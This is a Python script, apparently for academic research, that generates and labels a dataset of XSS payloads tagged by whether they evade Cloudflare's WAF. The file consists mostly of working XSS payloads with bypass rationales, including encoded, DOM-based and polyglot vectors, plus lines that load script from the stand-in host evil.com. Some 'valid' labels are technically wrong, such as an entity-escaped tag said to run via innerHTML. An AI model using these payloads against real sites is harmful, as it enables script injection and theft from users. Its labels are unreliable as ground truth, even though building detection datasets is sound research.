#!/usr/bin/env python3
"""
XSS Payload Generator for Academic Research
=============================================
Generates diverse XSS payloads with encoding variations targeting
Cloudflare WAF bypass scenarios. Outputs two files:
  1. xss_payloads_raw.txt   – one payload per line
  2. xss_dataset_labeled.json – fully labeled dataset

Usage: python generate_xss_payloads.py

Requirements: Python 3.7+ (standard library only)
"""

import json
import base64
import os

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))

# ---------------------------------------------------------------------------
# Payload definitions by category
# Each entry: (payload, encoding_type, scenario, target_context, waf_bypass, label, reason)
# ---------------------------------------------------------------------------

payloads_data = []
_id_counter = [0]

def add(payload, encoding_type, scenario, target_context, waf_bypass, label, reason):
    _id_counter[0] += 1
    payloads_data.append({
        "id": _id_counter[0],
        "scenario": scenario,
        "payload": payload,
        "encoding_type": encoding_type,
        "target_context": target_context,
        "waf_bypass": waf_bypass,
        "label": label,
        "reason": reason
    })

# ===========================
# 1. Raw / Unencoded Payloads
# ===========================

add("<script>alert('xss')</script>",
    "Raw", "反射型XSS", "HTML attribute",
    False, "invalid",
    "Classic script tag is immediately matched by Cloudflare WAF signature rules and blocked.")

add("<img src=x onerror=alert(1)>",
    "Raw", "反射型XSS", "HTML attribute",
    False, "invalid",
    "Standard img/onerror pattern is a well-known WAF signature; Cloudflare blocks it on reflection.")

add("<svg/onload=alert(1)>",
    "Raw", "反射型XSS", "HTML attribute",
    False, "invalid",
    "svg/onload is a common WAF rule target; blocked by Cloudflare managed ruleset.")

add("<body onload=alert('xss')>",
    "Raw", "儲存型XSS", "HTML attribute",
    False, "invalid",
    "Body onload handler is flagged by WAF event-handler detection rules.")

add("<details open ontoggle=alert(1)>",
    "Raw", "反射型XSS", "HTML attribute",
    True, "valid",
    "ontoggle on details element is less commonly covered by older WAF rulesets; may bypass Cloudflare if custom rules are not tuned.")

add("<marquee onstart=alert(1)>",
    "Raw", "儲存型XSS", "HTML attribute",
    True, "valid",
    "marquee/onstart is a lesser-known event handler that some Cloudflare rule configurations miss.")

add("<math><mtext><table><mglyph><style><!--</style><img title=\"-->&lt;img src=x onerror=alert(1)&gt;\">",
    "Raw", "反射型XSS", "HTML attribute",
    True, "valid",
    "Uses HTML parser differential between math/foreign content and HTML5 parsing to confuse WAF pattern matching.")

# ===========================
# 2. HTML Entity Encoded
# ===========================

add("&#60;script&#62;alert(1)&#60;/script&#62;",
    "HTML Entity Encoding", "反射型XSS", "HTML attribute",
    False, "invalid",
    "HTML numeric entities for angle brackets are not decoded by the browser in most injection contexts outside attribute values; payload does not execute.")

add("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "HTML Entity Encoding", "反射型XSS", "HTML attribute",
    False, "invalid",
    "Hex HTML entities for script tags are not parsed as real tags by the HTML parser in body context.")

add("&lt;img src=x onerror=alert(1)&gt;",
    "HTML Entity Encoding", "反射型XSS", "innerHTML",
    True, "valid",
    "When injected via innerHTML assignment, the browser decodes HTML entities first, then parses the result as HTML, causing execution. WAF may not decode entities before inspection.")

add("&#x3C;img src&#x3D;x onerror&#x3D;alert(1)&#x3E;",
    "HTML Entity Encoding", "DOM-based XSS", "innerHTML",
    True, "valid",
    "Full hex-entity encoded img tag executes when assigned to innerHTML; Cloudflare WAF typically inspects raw parameter values without entity decoding.")

add("&#60;svg&#32;onload&#61;alert&#40;1&#41;&#62;",
    "HTML Entity Encoding", "儲存型XSS", "innerHTML",
    True, "valid",
    "Decimal HTML entities bypass WAF string matching. The stored value is decoded by the browser when rendered via innerHTML.")

add("<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\">click</a>",
    "HTML Entity Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "javascript: protocol encoded with hex entities inside href attribute is decoded by the browser; WAF does not see the keyword 'javascript'.")

add("&#60;input onfocus&#61;alert(1) autofocus&#62;",
    "HTML Entity Encoding", "反射型XSS", "HTML attribute",
    False, "invalid",
    "HTML entities outside attribute values in a non-innerHTML context are rendered as text, not as HTML elements.")

# ===========================
# 3. URL Encoding
# ===========================

add("%3Cscript%3Ealert(1)%3C/script%3E",
    "URL Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "Single URL encoding is decoded by the web server before WAF inspection in most configurations; Cloudflare decodes and detects the script tag.")

add("%3Csvg%20onload%3Dalert(1)%3E",
    "URL Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "Standard URL-encoded svg/onload is decoded by Cloudflare's normalization layer and blocked.")

add("%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "URL Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "URL-encoded img/onerror pattern is decoded and matched by WAF rules after URL normalization.")

add("%3Cdetails%20open%20ontoggle%3Dalert(1)%3E",
    "URL Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "ontoggle event on details element may not be covered by default Cloudflare rules; URL decoding reveals valid HTML that executes in browser.")

add("%3Cmarquee%20onstart%3Dalert(1)%3E",
    "URL Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "marquee/onstart is not always in WAF signature databases; after URL decoding the payload is valid HTML.")

# ===========================
# 4. Unicode / Hex Encoding
# ===========================

add("<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
    "Unicode Encoding", "反射型XSS", "script block",
    True, "valid",
    "Unicode escapes in JavaScript event handler context are valid JS; the browser's JS engine decodes them. WAF may not perform Unicode normalization on attribute values.")

add("<svg onload=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
    "Unicode Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "JavaScript Unicode escapes in event handler attributes are decoded by the JS engine at runtime, bypassing WAF string matching for 'alert'.")

add("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "Unicode Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "Unicode escapes for angle brackets are NOT decoded in HTML context; the browser sees literal backslash-u sequences, not HTML tags.")

add("\\u003csvg\\u0020onload\\u003dalert(1)\\u003e",
    "Unicode Encoding", "DOM-based XSS", "URL parameter",
    False, "invalid",
    "Unicode-escaped angle brackets do not produce HTML elements; payload remains inert text.")

add("javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(1)",
    "Unicode Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "In javascript: URLs, Unicode escapes are valid JS identifiers; the browser decodes them when executing the protocol handler. WAF may miss the 'alert' keyword.")

add("<iframe src=\"javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(1)\">",
    "Unicode Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "iframe src with javascript: protocol using Unicode escapes for the function name bypasses keyword-based WAF detection.")

add("<img src=x onerror=\"\\x61\\x6c\\x65\\x72\\x74(1)\">",
    "Unicode Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "Hex escapes (\\x61) are valid in JavaScript string/identifier contexts within event handlers; WAF does not decode JS hex escapes.")

# ===========================
# 5. Double Encoding
# ===========================

add("%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "Double Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "Double URL encoding: first decode by reverse proxy yields %3Cscript%3E, second decode by application yields <script>. Cloudflare typically decodes only once.")

add("%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
    "Double Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "Double-encoded img/onerror bypasses WAF that performs single URL decode normalization; the application performs the second decode.")

add("%253Csvg%2520onload%253Dalert(1)%253E",
    "Double Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "Double-encoded svg tag passes WAF inspection as encoded characters; application decodes to executable HTML.")

add("%253Cdetails%2520open%2520ontoggle%253Dalert(1)%253E",
    "Double Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "Double encoding combined with lesser-known ontoggle event makes this doubly evasive against WAF rules.")

add("%253Cbody%2520onload%253Dalert(1)%253E",
    "Double Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "Even with double encoding, if the application does not perform a second URL decode, the payload remains encoded and inert.")

add("%25253Cscript%25253Ealert(1)%25253C/script%25253E",
    "Double Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "Triple encoding is rarely decoded by any application layer; payload remains as percent-encoded text and does not execute.")

# ===========================
# 6. Mixed Encoding
# ===========================

add("%3Cscr%69pt%3E&#97;lert(1)%3C/scr%69pt%3E",
    "Mixed Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "Mixing URL encoding (%69) and HTML entity (&#97;) across different parsing stages can bypass WAF rules that expect uniform encoding.")

add("<%73cript>al\\u0065rt(1)</%73cript>",
    "Mixed Encoding", "反射型XSS", "HTML attribute",
    False, "invalid",
    "URL-encoded character inside HTML tag name (%73 for 's') is not decoded in tag context; browser does not recognize the tag.")

add("<img src=x onerror=\"&#97;l\\u0065rt(1)\">",
    "Mixed Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "HTML entity &#97; decoded in attribute value + Unicode escape \\u0065 decoded by JS engine = 'alert(1)' executes. WAF sees neither keyword.")

add("<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
    "Mixed Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "HTML numeric entities in event handler attribute values are decoded by the browser before JS execution; WAF inspects raw entities and misses 'alert'.")

add("%3Csvg%2Fonload%3D%26%2397%3Blert(1)%3E",
    "Mixed Encoding", "反射型XSS", "URL parameter",
    True, "valid",
    "URL-encoded HTML structure with embedded HTML entity for 'a' in alert; multi-layer decoding confuses WAF normalization.")

add("<scr%00ipt>alert(1)</scr%00ipt>",
    "Mixed Encoding", "反射型XSS", "HTML attribute",
    False, "invalid",
    "Null byte insertion (%00) in tag name is handled differently by browsers and servers; modern browsers reject malformed tags.")

# ===========================
# 7. Base64 Encoding Embedded
# ===========================

b64_alert = base64.b64encode(b"alert(1)").decode()
b64_script = base64.b64encode(b"<script>alert(1)</script>").decode()

add(f"<script>eval(atob('{b64_alert}'))</script>",
    "Base64 Encoding", "反射型XSS", "script block",
    False, "invalid",
    "The outer <script> tag is detected by Cloudflare WAF rules regardless of the Base64 payload inside.")

add(f"<img src=x onerror=eval(atob('{b64_alert}'))>",
    "Base64 Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "img/onerror with eval(atob()) hides the actual JS function name inside Base64; some WAF rules focus on the decoded alert() keyword which is absent.")

add(f"<svg onload=eval(atob('{b64_alert}'))>",
    "Base64 Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "Base64-wrapped alert inside svg/onload event handler; WAF regex does not decode Base64 content during inspection.")

add(f"<details open ontoggle=eval(atob('{b64_alert}'))>",
    "Base64 Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "ontoggle event with Base64-encoded payload combines a lesser-known event handler with encoding obfuscation to bypass WAF.")

add(f"<iframe src=\"data:text/html;base64,{base64.b64encode(b'<script>alert(1)</script>').decode()}\">",
    "Base64 Encoding", "反射型XSS", "HTML attribute",
    True, "valid",
    "data: URI with Base64-encoded HTML containing script tag; the WAF cannot decode data URIs inline, and the browser renders the decoded HTML.")

add(f"<a href=\"data:text/html;base64,{base64.b64encode(b'<script>alert(1)</script>').decode()}\">click</a>",
    "Base64 Encoding", "反射型XSS", "HTML attribute",
    False, "invalid",
    "Modern browsers block javascript execution from data: URIs in anchor href for top-level navigation due to security policies.")

add(f"<object data=\"data:text/html;base64,{base64.b64encode(b'<script>alert(document.domain)</script>').decode()}\">",
    "Base64 Encoding", "儲存型XSS", "HTML attribute",
    True, "valid",
    "object element with data: URI containing Base64 script; renders in a sandboxed context but may execute if no CSP restricts data: sources.")

# ===========================
# 8. DOM-based Bypass Variants
# ===========================

add("';document.location='javascript:alert(1)'//",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "Breaks out of JS string context and redirects via javascript: protocol; WAF does not see DOM manipulation context.")

add("'-alert(1)-'",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "Minimal JS expression injection using arithmetic operators to invoke alert; no HTML tags involved, bypasses tag-based WAF rules.")

add("\";alert(1)//",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "Breaks out of double-quoted string in inline script; pure JS injection without HTML elements evades HTML-focused WAF rules.")

add("javascript:void(document.cookie='xss=1')",
    "DOM-based", "DOM-based XSS", "URL parameter",
    False, "invalid",
    "javascript: in URL bar is blocked by modern browsers; does not execute in most reflection contexts.")

add("document.write('<img src=x onerror=alert(1)>')",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "If injected into an existing script block, document.write injects HTML at parse time; WAF inspects parameters, not DOM operations.")

add("window['al'+'ert'](document.domain)",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "String concatenation to construct 'alert' at runtime bypasses WAF keyword detection; valid JS that executes alert.")

add("location.href='javascript:alert(1)'",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "Assignment to location.href with javascript: protocol causes execution; WAF may not detect this as XSS since there are no HTML tags.")

add("setTimeout('ale'+'rt(1)',0)",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "setTimeout with string concatenation to build the alert call; WAF cannot reassemble the split keyword.")

# ===========================
# 9. Cloudflare-Specific Bypass Techniques
# ===========================

# 9a. Case mixing
add("<ScRiPt>alert(1)</ScRiPt>",
    "Cloudflare Bypass - Case Mixing", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Cloudflare WAF performs case-insensitive matching; mixed case script tags are still detected.")

add("<iMg SrC=x OnErRoR=aLeRt(1)>",
    "Cloudflare Bypass - Case Mixing", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Cloudflare normalizes case before rule matching; mixed case img/onerror is still caught.")

add("<DeTaIlS oPeN oNtOgGlE=alert(1)>",
    "Cloudflare Bypass - Case Mixing", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "ontoggle on details with mixed case may bypass Cloudflare if the specific event handler is not in the managed ruleset.")

add("<SvG/OnLoAd=prompt(1)>",
    "Cloudflare Bypass - Case Mixing", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Using prompt() instead of alert() with mixed case SVG avoids the specific 'alert' keyword rule; prompt is less commonly blocked.")

add("<MARQUEE ONSTART=confirm(1)>",
    "Cloudflare Bypass - Case Mixing", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "confirm() function with uppercase marquee/onstart; Cloudflare rules may focus on alert() and miss confirm().")

# 9b. Whitespace / newline / zero-width character insertion
add("<img\tsrc=x\tonerror=alert(1)>",
    "Cloudflare Bypass - Whitespace Insertion", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Tab characters (\\t) between attributes are valid HTML whitespace but may not be normalized by WAF regex patterns expecting spaces.")

add("<img\nsrc=x\nonerror=alert(1)>",
    "Cloudflare Bypass - Whitespace Insertion", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Newline characters between attributes are valid HTML; WAF single-line regex patterns may fail to match across line boundaries.")

add("<img\r\nsrc=x\r\nonerror=alert(1)>",
    "Cloudflare Bypass - Whitespace Insertion", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "CRLF sequences as attribute separators are valid HTML but may break WAF pattern matching that does not handle multi-line input.")

add("<svg\u200Bonload=alert(1)>",
    "Cloudflare Bypass - Zero-Width Character", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Zero-width space (U+200B) between tag name and attribute is not valid HTML whitespace; browser does not parse onload as an attribute.")

add("<img src=x onerror\u200B=alert(1)>",
    "Cloudflare Bypass - Zero-Width Character", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Zero-width space in attribute name makes it an unknown attribute; browser does not recognize it as onerror handler.")

add("<scr\u200Bipt>alert(1)</scr\u200Bipt>",
    "Cloudflare Bypass - Zero-Width Character", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Zero-width space inside tag name creates an unrecognized tag; HTML parser does not interpret it as script element.")

# 9c. Segmented / fragmented injection
add("</title><script>alert(1)</script>",
    "Cloudflare Bypass - Segmented Injection", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Closing an open <title> tag before injecting script; WAF may analyze the parameter in isolation and miss the context-breaking injection.")

add("</textarea><svg onload=alert(1)>",
    "Cloudflare Bypass - Segmented Injection", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Breaking out of textarea element before injecting SVG; WAF may not detect the context switch from raw text element to HTML.")

add("</style><img src=x onerror=alert(1)>",
    "Cloudflare Bypass - Segmented Injection", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Closing style block to break into HTML context; the WAF may treat the input as CSS content and not apply HTML rules.")

add("--><script>alert(1)</script><!--",
    "Cloudflare Bypass - Segmented Injection", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Closing HTML comment then injecting script, followed by opening another comment; WAF comment-aware parsing may be confused.")

add("*/alert(1)/*",
    "Cloudflare Bypass - Segmented Injection", "Cloudflare WAF繞過", "script block",
    True, "valid",
    "Closing a JS multi-line comment, executing alert, then opening another comment; pure JS injection without HTML tags.")

# 9d. Event handler variations
add("<video src=x onerror=alert(1)>",
    "Cloudflare Bypass - Event Handler Variation", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "video element onerror handler is less commonly in WAF rulesets compared to img/onerror; valid HTML5 that triggers on source load failure.")

add("<audio src=x onerror=alert(1)>",
    "Cloudflare Bypass - Event Handler Variation", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "audio element onerror is a valid HTML5 event handler that may not be in Cloudflare's managed rule signatures.")

add("<input onfocus=alert(1) autofocus>",
    "Cloudflare Bypass - Event Handler Variation", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "input/onfocus with autofocus is now a well-known WAF bypass vector; Cloudflare has added specific rules for autofocus-based triggers.")

add("<select onfocus=alert(1) autofocus>",
    "Cloudflare Bypass - Event Handler Variation", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "select element with onfocus and autofocus is less commonly blocked; valid HTML that triggers focus event automatically.")

add("<keygen onfocus=alert(1) autofocus>",
    "Cloudflare Bypass - Event Handler Variation", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "keygen element is deprecated and removed from modern browsers; payload does not execute regardless of WAF status.")

add("<body/onhashchange=alert(1)><a href=#>click",
    "Cloudflare Bypass - Event Handler Variation", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "onhashchange event fires when URL fragment changes; less commonly covered by WAF rules and requires user interaction via anchor click.")

# 9e. Advanced Cloudflare bypasses combining techniques
add("<svg/onload=\"prompt`1`\">",
    "Cloudflare Bypass - Template Literal", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Tagged template literal syntax prompt`1` avoids parentheses which WAF rules commonly match; valid ES6 JS that executes.")

add("<img src=x onerror=window['alert'](1)>",
    "Cloudflare Bypass - Bracket Notation", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Bracket notation window['alert'] avoids direct function call syntax matched by WAF; semantically equivalent JS.")

add("<img src=x onerror=self['ale'+'rt'](1)>",
    "Cloudflare Bypass - String Concat", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "String concatenation inside bracket notation reconstructs 'alert' at runtime; WAF cannot match the split keyword.")

add("<img src=x onerror=top[`al`+`ert`](1)>",
    "Cloudflare Bypass - Template Concat", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Template literal concatenation with top[] global reference; another variant to avoid WAF keyword matching.")

add("<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "Cloudflare Bypass - SVG Animate", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "SVG animate element with onbegin event handler; exotic SVG event handlers are often missing from WAF rule databases.")

add("<svg><set onbegin=alert(1) attributename=x to=1>",
    "Cloudflare Bypass - SVG Set", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "SVG set element with onbegin is another rarely-blocked SVG-specific event handler that executes immediately.")

add("<img src=x onerror=Function('ale'+'rt(1)')()>",
    "Cloudflare Bypass - Function Constructor", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Function constructor with split string avoids direct alert() reference; WAF does not reconstruct dynamic function creation.")

add("<img src=x onerror=eval?.('alert(1)')>",
    "Cloudflare Bypass - Optional Chaining", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Optional chaining operator (?.) with eval is valid ES2020 syntax; newer syntax patterns may not be in WAF rule signatures.")

# 9f. CSP bypass scenarios
add("<script nonce=abc>alert(1)</script>",
    "CSP Bypass Attempt", "CSP繞過", "script block",
    False, "invalid",
    "Guessed nonce value is extremely unlikely to match the server-generated nonce; CSP blocks execution.")

add("<base href='https://evil.com/'>",
    "CSP Bypass - Base Tag", "CSP繞過", "HTML attribute",
    True, "valid",
    "Injecting base tag to change relative script sources; if CSP does not restrict base-uri, relative script paths resolve to attacker domain.")

add("<script src='https://evil.com/xss.js'></script>",
    "CSP Bypass Attempt", "CSP繞過", "script block",
    False, "invalid",
    "External script from unauthorized domain is blocked by CSP script-src directive that does not include evil.com.")

add("<link rel=import href='https://evil.com/xss.html'>",
    "CSP Bypass - HTML Import", "CSP繞過", "HTML attribute",
    False, "invalid",
    "HTML imports are deprecated and not supported by modern browsers; payload does not execute.")

add("<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "CSP Bypass - Meta Refresh", "CSP繞過", "HTML attribute",
    False, "invalid",
    "Modern browsers do not execute javascript: in meta refresh URL; CSP also blocks inline script execution.")

# Additional mixed payloads to balance valid/invalid ratio
add("javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
    "Mixed Encoding", "Cloudflare WAF繞過", "URL parameter",
    True, "valid",
    "Polyglot XSS payload that works across multiple injection contexts by closing potential enclosing elements; complex structure evades pattern-based WAF.")

add("<script>onerror=alert;throw 1</script>",
    "Raw", "反射型XSS", "script block",
    False, "invalid",
    "While a clever technique, the outer script tag is immediately matched and blocked by Cloudflare WAF.")

add("';var x=new Function('al'+'ert(1)');x()//",
    "DOM-based", "DOM-based XSS", "script block",
    True, "valid",
    "Function constructor with string concatenation inside JS context; no HTML tags means HTML-focused WAF rules do not trigger.")

add("<img/src=`x`onerror=alert(1)>",
    "Cloudflare Bypass - Backtick", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Backtick as attribute value delimiter instead of quotes; some WAF parsers do not recognize backticks as valid delimiters in HTML context.")

add("<svg><desc><template><svg onload=alert(1)>",
    "Cloudflare Bypass - Nested Context", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Nested SVG contexts with template element create parsing confusion; inner SVG onload executes in some browsers while WAF sees nested structure.")

add("<math><mi//teleport=alert(1) xmlns=\"http://www.w3.org/1998/Math/MathML\">",
    "Cloudflare Bypass - MathML", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "MathML element with invalid attribute does not execute JavaScript; teleport is not a valid event handler.")

add("<<script>alert(1)//<</script>",
    "Cloudflare Bypass - Double Bracket", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Double opening angle bracket creates malformed HTML; modern HTML parsers treat the extra < as text content.")

add("<x/onclick=alert(1)>click",
    "Cloudflare Bypass - Custom Element", "Cloudflare WAF繞過", "HTML attribute",
    True, "valid",
    "Custom/unknown HTML elements still support global event handlers; WAF may not flag unknown tag names with event handlers.")

# ===========================
# Additional invalid payloads to balance valid/invalid ratio (~60:40)
# ===========================

add("<script>alert(1)</script>",
    "Raw", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Unobfuscated script tag with alert is the most basic WAF signature; Cloudflare blocks this with highest confidence.")

add("<SCRIPT>ALERT(1)</SCRIPT>",
    "Cloudflare Bypass - Case Mixing", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Fully uppercase script and alert are still matched by Cloudflare case-insensitive rules.")

add("%3Cinput%20onfocus%3Dalert(1)%20autofocus%3E",
    "URL Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "URL-encoded input/onfocus/autofocus is a known pattern; Cloudflare decodes and blocks it.")

add("&#60;iframe src=&#34;javascript:alert(1)&#34;&#62;",
    "HTML Entity Encoding", "反射型XSS", "HTML attribute",
    False, "invalid",
    "HTML entities for iframe/javascript in non-innerHTML context render as text; browser does not create an iframe element.")

add("%253Cinput%2520autofocus%2520onfocus%253Dalert(1)%253E",
    "Double Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "Double-encoded input/autofocus/onfocus: even if double-decoded, Cloudflare has updated rules to catch autofocus-based XSS vectors.")

add("\\u003cinput\\u0020onfocus\\u003dalert(1)\\u0020autofocus\\u003e",
    "Unicode Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "Unicode-escaped HTML tags are not decoded by browsers in HTML context; the payload renders as literal text.")

b64_cookie = base64.b64encode(b"document.cookie").decode()
add(f"<script>eval(atob('{b64_cookie}'))</script>",
    "Base64 Encoding", "儲存型XSS", "script block",
    False, "invalid",
    "Outer script tag triggers WAF detection regardless of Base64-encoded content; Cloudflare blocks the script element pattern.")

add("';alert(document.domain)//",
    "DOM-based", "DOM-based XSS", "HTML attribute",
    False, "invalid",
    "JS breakout payload injected into HTML attribute context (not inside a script block) is treated as attribute text; does not execute.")

add("<img src=x onerror=alert(1) data-custom='test'>",
    "Raw", "儲存型XSS", "HTML attribute",
    False, "invalid",
    "Standard img/onerror even with additional attributes is detected by Cloudflare WAF pattern matching on event handlers.")

add("<ScRiPt SrC=//evil.com/x.js></ScRiPt>",
    "Cloudflare Bypass - Case Mixing", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Mixed case external script inclusion is still caught by Cloudflare; script tag with src attribute is a core WAF signature.")

add("java\tscript:alert(1)",
    "Cloudflare Bypass - Whitespace Insertion", "Cloudflare WAF繞過", "HTML attribute",
    False, "invalid",
    "Tab character inside javascript: protocol keyword breaks the protocol recognition; browser does not execute it as JavaScript.")

add("%3Cbody%20onpageshow%3Dalert(1)%3E",
    "URL Encoding", "反射型XSS", "URL parameter",
    False, "invalid",
    "onpageshow on body element is now included in Cloudflare's managed rules; URL-decoded payload is blocked.")

# ---------------------------------------------------------------------------
# Output generation
# ---------------------------------------------------------------------------

def generate_outputs():
    raw_path = os.path.join(OUTPUT_DIR, "xss_payloads_raw.txt")
    json_path = os.path.join(OUTPUT_DIR, "xss_dataset_labeled.json")

    # Write raw payloads
    with open(raw_path, "w", encoding="utf-8") as f:
        for entry in payloads_data:
            f.write(entry["payload"] + "\n")

    # Write labeled dataset
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(payloads_data, f, ensure_ascii=False, indent=2)

    # Print statistics
    total = len(payloads_data)
    valid_count = sum(1 for e in payloads_data if e["label"] == "valid")
    invalid_count = total - valid_count
    valid_pct = (valid_count / total) * 100 if total else 0
    invalid_pct = (invalid_count / total) * 100 if total else 0

    print(f"=" * 60)
    print(f"XSS Payload Dataset Generator - Output Summary")
    print(f"=" * 60)
    print(f"Total payloads generated: {total}")
    print(f"  Valid:   {valid_count} ({valid_pct:.1f}%)")
    print(f"  Invalid: {invalid_count} ({invalid_pct:.1f}%)")
    print(f"")

    # Breakdown by encoding type
    enc_types = {}
    for e in payloads_data:
        et = e["encoding_type"]
        if et not in enc_types:
            enc_types[et] = {"valid": 0, "invalid": 0}
        enc_types[et][e["label"]] += 1

    print(f"Breakdown by encoding type:")
    print(f"{'Encoding Type':<45} {'Valid':>6} {'Invalid':>8} {'Total':>6}")
    print(f"-" * 70)
    for et, counts in enc_types.items():
        t = counts["valid"] + counts["invalid"]
        print(f"  {et:<43} {counts['valid']:>6} {counts['invalid']:>8} {t:>6}")

    # Breakdown by scenario
    scenarios = {}
    for e in payloads_data:
        sc = e["scenario"]
        if sc not in scenarios:
            scenarios[sc] = 0
        scenarios[sc] += 1

    print(f"\nBreakdown by scenario:")
    for sc, count in scenarios.items():
        print(f"  {sc}: {count}")

    print(f"\nOutput files:")
    print(f"  Raw payloads:     {raw_path}")
    print(f"  Labeled dataset:  {json_path}")
    print(f"=" * 60)


if __name__ == "__main__":
    generate_outputs()


# ===========================================================================
# DATASET CONSTRUCTION NOTES (for citation in academic papers)
# ===========================================================================
#
# Dataset Construction Methodology
# ---------------------------------
# This dataset was constructed to support research on using Large Language
# Models (LLMs) for automated detection and classification of Cross-Site
# Scripting (XSS) attacks, with a specific focus on Web Application Firewall
# (WAF) evasion techniques targeting Cloudflare's managed ruleset.
#
# 1. CATEGORY DESIGN
#    The payloads are organized across 9 encoding/transformation categories:
#    (a) Raw/Unencoded: Baseline payloads using standard HTML/JS syntax
#    (b) HTML Entity Encoding: Numeric (&#60;) and hex (&#x3C;) entity variants
#    (c) URL Encoding: Standard percent-encoding (%3C, %3E, etc.)
#    (d) Unicode/Hex Encoding: JS Unicode escapes (\u0061) and hex (\x61)
#    (e) Double Encoding: Multiple layers of URL encoding (%253C)
#    (f) Mixed Encoding: Combining HTML entities, URL encoding, and Unicode
#    (g) Base64 Encoding: Payloads wrapped in atob()/data: URIs
#    (h) DOM-based Variants: Pure JavaScript injection without HTML tags
#    (i) Cloudflare-Specific Bypasses: Techniques targeting known WAF gaps
#
# 2. CLOUDFLARE WAF BYPASS RATIONALE
#    Bypasses are categorized by the evasion technique employed:
#    - Case Mixing: Exploiting case-insensitive matching gaps
#    - Whitespace/Newline Insertion: Breaking regex patterns across lines
#    - Zero-Width Characters: Testing Unicode normalization behavior
#    - Segmented Injection: Context-breaking through tag closure
#    - Event Handler Variation: Using obscure HTML5 event handlers
